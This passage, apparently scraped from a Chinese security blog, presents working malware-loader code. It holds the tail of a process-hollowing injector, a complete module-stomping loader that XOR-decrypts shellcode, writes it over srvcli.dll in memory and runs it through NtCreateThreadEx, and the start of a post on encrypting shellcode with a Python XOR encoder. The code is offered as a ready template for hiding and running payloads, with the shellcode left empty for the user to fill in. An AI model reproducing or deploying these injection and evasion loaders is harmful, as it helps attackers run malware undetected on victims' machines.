<span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">    hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">    FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取挂起进程的上下文</span></span><br><span class="line">    <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> <span class="comment">//获取挂起进程的映像基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">    RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//逐段写入</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将rax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//将eax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    lea eax</span></span><br><span class="line"><span class="comment">    call eax</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="16-模块践踏"><a href="#16-模块践踏" class="headerlink" title="16.模块践踏"></a>16.模块践踏</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>模块践踏通常涉及到选择一个已经加载到内存中的模块，然后覆盖或替换这个模块的部分内容，通常是其.text段（代码段），以实现恶意代码的注入</p>
<h2 id="实现思路-3"><a href="#实现思路-3" class="headerlink" title="实现思路"></a>实现思路</h2><ol>
<li>在内存中加载srvcli.dll模块，并找到这个模块在内存中的地址。</li>
<li>定义了一个包含加密后shellcode的数组（encryptedShellcode）和一个密钥（key）。此shellcode是以异或加密的形式给出的。</li>
<li>创建一个新的数组（shellcode），用于存储解密后的shellcode。使用给定的密钥对加密的shellcode进行解密。</li>
<li>调用<code>NtProtectVirtualMemory</code>函数改变选定内存区域的保护属性，将其改为可读写。</li>
<li>使用<code>RtlMoveMemory</code>函数将解密后的shellcode复制到目标模块（srvcli.dll）在内存中的地址。</li>
<li>使用<code>NtProtectVirtualMemory</code>函数恢复原来的内存保护属性。</li>
<li>创建一个新线程来执行注入的shellcode。新线程的入口点设置为shellcode的内存地址。</li>
<li>调用<code>NtWaitForSingleObject</code>等待新创建的线程执行完毕。</li>
</ol>
<h2 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">WCHAR* slib = (WCHAR*)<span class="string">L&quot;C:\\Windows\\system32\\srvcli.dll&quot;</span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtAllocateVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG_PTR ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG AllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Protect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtProtectVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG NewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PULONG OldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PHANDLE hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T StackZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackCommit,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackReserve,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PVOID lpBytesBuffer</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtWaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN BOOLEAN Alertable,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PLARGE_INTEGER Timeout</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecryptAES</span><span class="params">(<span class="type">char</span>* shellcode, DWORD shellcodeLen, <span class="type">char</span>* key, DWORD keyLen)</span> </span>&#123;</span><br><span class="line">	HCRYPTPROV hProv;</span><br><span class="line">	HCRYPTHASH hHash;</span><br><span class="line">	HCRYPTKEY hKey;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptAcquireContextW</span>(&amp;hProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES,</span><br><span class="line">		CRYPT_VERIFYCONTEXT)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptAcquireContextW (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptCreateHash</span>(hProv, CALG_SHA_256, <span class="number">0</span>, <span class="number">0</span>, &amp;hHash)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptCreateHash (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptHashData</span>(hHash, (BYTE*)key, keyLen, <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptHashData (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDeriveKey</span>(hProv, CALG_AES_256, hHash, <span class="number">0</span>, &amp;hKey)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDeriveKey (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDecrypt</span>(hKey, (HCRYPTHASH)<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, (BYTE*)shellcode,</span><br><span class="line">		&amp;shellcodeLen)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDecrypt (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CryptReleaseContext</span>(hProv, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">CryptDestroyHash</span>(hHash);</span><br><span class="line">	<span class="built_in">CryptDestroyKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 填写xor加密后的shellcode</span></span><br><span class="line">	<span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	DWORD payload_length = <span class="built_in">sizeof</span>(encryptedShellcode);</span><br><span class="line">	PVOID BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T dwSize = <span class="number">0x2000</span>;</span><br><span class="line">	HMODULE addr;</span><br><span class="line">	addr = <span class="built_in">LoadLibrary</span>(slib);</span><br><span class="line">	BaseAddress = addr + <span class="number">0x1000</span> * <span class="number">2</span> + <span class="number">0xf</span>; <span class="comment">//2kb+f</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; ptr：%p&quot;</span>, BaseAddress);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line">	<span class="comment">// 获取密钥的长度</span></span><br><span class="line">	<span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line">	<span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">		shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(BaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		OldProtect, &amp;OldProtect);</span><br><span class="line">	HANDLE hHostThread = INVALID_HANDLE_VALUE;</span><br><span class="line">	NTSTATUS NtCreateThreadstatus = <span class="built_in">NtCreateThreadEx</span>(&amp;hHostThread, <span class="number">0x1FFFFF</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="built_in">NtCurrentProcess</span>(), (LPTHREAD_START_ROUTINE)BaseAddress, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NtCreateThreadstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtCreateThreadEx (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LARGE_INTEGER Timeout;</span><br><span class="line">	Timeout.QuadPart = <span class="number">-10000000</span>;</span><br><span class="line">	NTSTATUS NTWFSOstatus = <span class="built_in">NtWaitForSingleObject</span>(hHostThread, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NTWFSOstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtWaitForSingleObject (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>










      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是私钥和公钥"><a href="#什么是私钥和公钥" class="headerlink" title="什么是私钥和公钥"></a>什么是私钥和公钥</h2><p>私钥和公钥是密码学中用于实现加密、解密和数字签名等功能的关键组件。</p>
<p>私钥是一种加密算法中的秘密密钥，只有密钥的拥有者可以访问和使用它。私钥通常用于数字签名和数据加密等场景中，它可以用于对数据进行加密，同时也可以用于解密已经被加密的数据。</p>
<p>公钥是与私钥对应的一种公开密钥，它可以被任何人访问和使用。公钥通常用于数据加密、身份认证和数字签名等场景中。公钥可以被用来加密数据，同时也可以用于验证数字签名的有效性。</p>
<p>在非对称加密算法中，公钥和私钥是一对密钥，它们共同参与加密和解密过程。公钥用于加密数据，而私钥用于解密数据。因此，使用非对称加密算法时，数据的接收方会将其私钥保存为秘密，而将其公钥发送给发送方。这样，发送方就可以使用接收方的公钥来加密数据，而接收方可以使用其私钥来解密数据。</p>
<p>需要注意的是，私钥和公钥是成对出现的，它们必须同时使用才能确保数据的安全性和完整性。因此，在使用私钥和公钥进行数据加密、解密和数字签名等操作时，必须确保私钥的安全性和保密性</p>
<h2 id="了解对称加密和非对称加密"><a href="#了解对称加密和非对称加密" class="headerlink" title="了解对称加密和非对称加密"></a>了解对称加密和非对称加密</h2><ul>
<li>对称加密：在对称加密中，加密和解密使用的是同一个密钥，通常称为共享密钥。这意味着在加密数据时，发送方和接收方都需要使用相同的密钥。对称加密算法的速度较快，适用于对大量数据进行加密。然而，对称加密的一个主要缺点是密钥管理。由于发送方和接收方需要使用相同的密钥，因此密钥的安全传输和存储成为一个挑战。一旦密钥被泄露，加密数据的安全性就会受到威胁。常见的对称加密算法有：AES（高级加密标准）、DES（数据加密标准）和3DES（三重数据加密标准）。</li>
<li>非对称加密：非对称加密使用一对密钥，分别称为公钥和私钥。公钥是公开的，可以被任何人获取，而私钥是保密的，只有密钥所有者才能访问。在非对称加密中，数据可以用公钥加密，然后只能用相应的私钥解密；反之亦然，用私钥加密的数据只能用公钥解密。这样，密钥的管理问题得到了解决，因为只需要保护私钥的安全。非对称加密的一个缺点是加密和解密过程相对较慢，因此通常不适用于加密大量数据。常见的非对称加密算法有：RSA（Rivest-Shamir-Adleman）、DSA（数字签名算法）和ECC（椭圆曲线密码学）。</li>
</ul>
<p>在实际应用中，对称加密和非对称加密通常会结合使用，以充分利用两者的优点。例如，通过非对称加密安全地传输对称加密的密钥，然后使用对称加密对数据进行加密。这样既解决了密钥管理问题，又能快速地加密大量数</p>
<h1 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h1><h2 id="什么是xor加密"><a href="#什么是xor加密" class="headerlink" title="什么是xor加密"></a>什么是xor加密</h2><p>XOR加密又称为异或加密，异或加密属于对称加密。在异或加密中，使用一个密钥（通常称为密钥流）与明文数据进行异或操作，生成加密后的密文。解密过程与加密过程相同，将密文与相同的密钥流进行异或操作，即可恢复原始明文数据</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>使用<code>Shellcode_XorEncoder.py</code>对shellcode进行异或加密，随后输出加密后的shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义异或加密函数，接收原始shellcode和密钥作为输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">shellcode, key</span>):</span><br><span class="line">    encrypted_shellcode = <span class="built_in">bytearray</span>()</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历shellcode中的每个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">        <span class="comment"># 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中</span></span><br><span class="line">        <span class="comment"># 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用</span></span><br><span class="line">        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])</span><br><span class="line">    <span class="keyword">return</span> encrypted_shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 填写你的shellcode</span></span><br><span class="line">    <span class="comment"># buf = b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span 